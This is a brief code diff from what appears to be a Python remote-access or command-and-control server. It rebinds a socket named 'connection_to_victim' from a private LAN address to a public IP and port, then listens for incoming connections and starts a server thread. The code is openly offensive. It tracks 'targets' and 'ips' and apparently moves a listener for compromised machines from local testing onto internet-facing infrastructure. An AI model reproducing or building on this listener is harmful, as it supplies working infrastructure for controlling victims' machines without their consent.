@@ -229,7 +229,7 @@ ips = []
 targets = []
 stop_threads = False
 connection_to_victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection_to_victim.bind(("192.168.0.105", 8081))
+connection_to_victim.bind(("107.173.87.48", 8999))
 connection_to_victim.listen(10)
 t1 = threading.Thread(target=server)
 t1.start()
